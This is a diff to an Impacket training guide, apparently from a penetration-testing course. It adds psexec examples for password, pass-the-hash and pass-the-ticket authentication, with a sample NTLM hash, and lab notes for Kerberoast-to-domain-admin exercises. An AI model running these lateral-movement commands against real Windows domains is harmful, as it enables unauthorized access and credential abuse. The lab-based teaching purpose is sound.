@@ -44,7 +44,7 @@
 
 **Prerequisites:** TCP/IP networking. Understanding of Windows authentication (NTLM, Kerberos). Basic Active Directory concepts (domains, domain controllers, users, groups, SPNs). Python basics (Impacket is Python-based).
 
-**Alternatives:** CrackMapExec/NetExec (wrapper around many Impacket techniques with simpler syntax), Evil-WinRM (WinRM shell), Rubeus (Kerberos attacks from Windows), Mimikatz (credential extraction from Windows), PowerView (AD enumeration from Windows), BloodHound (AD path visualization).
+**Alternatives:** See [_Notes.md](_Notes.md#alternatives--tool-comparisons) for alternative tools.
 
 ---
 
@@ -53,6 +53,35 @@
 > **Naming note:** `apt`/Kali installs prefix every script with `impacket-` and drop `.py`  
 > (e.g. `impacket-secretsdump`). A `pip`/`pipx` install keeps the original `.py` names  
 > (e.g. `secretsdump.py`). Both forms are shown below.
+
+### 🎯 Three Authentication Modes (Critical)
+
+Impacket supports three ways to authenticate. Choose based on what credentials you have:
+
+**1. Password Authentication:**
+```bash
+impacket-psexec DOMAIN/user:password@TARGET
+```
+
+**2. NTLM Hash (Pass-the-Hash):**
+```bash
+impacket-psexec -hashes :NTLM_HASH DOMAIN/user@TARGET
+# Format: -hashes LM:NTLM (LM is optional, use aad3b435b51404eeaad3b435b51404ee as placeholder)
+```
+
+**3. Kerberos Ticket (Pass-the-Ticket):**
+```bash
+export KRB5CCNAME=/path/to/ticket.ccache
+impacket-psexec -k -no-pass DOMAIN/user@TARGET
+# Must use hostname (not IP) for Kerberos
+```
+
+**LM Hash Placeholder:** When you only have NTLM hash, use `aad3b435b51404eeaad3b435b51404ee` as the LM portion:
+```bash
+impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99 DOMAIN/admin@TARGET
+```
+
+---
 
 ### Essential Commands
 ```bash
@@ -469,6 +498,8 @@ impacket-wmiexec -hashes :NTLM corp.local/admin@10.10.10.1
 
 ### Lab 6.3 — Advanced: Kerberoast to Domain Admin
 
+> ⚠️ **Lab Requirement:** This lab requires a Windows Active Directory environment (Windows Server + Windows 10 domain-joined client minimum). Cannot be completed with Metasploitable 2 alone.
+
 - [ ] **Completed** · ⭐⭐⭐⭐ Advanced · ⏱️ 120 min
 
 | **Scenario** | From a low-privilege domain account: Kerberoast → crack service account hash → lateral movement → DCSync → domain admin. |
@@ -477,6 +508,8 @@ impacket-wmiexec -hashes :NTLM corp.local/admin@10.10.10.1
 ---
 
 ### Lab 6.4 — Expert: Full AD Compromise
+
+> ⚠️ **Lab Requirement:** This lab requires a full Windows Active Directory lab environment. Recommended setup: Windows Server 2019 (Domain Controller) + 2x Windows 10 clients (domain-joined).
 
 - [ ] **Completed** · ⭐⭐⭐⭐⭐ Expert · ⏱️ 180 min
 
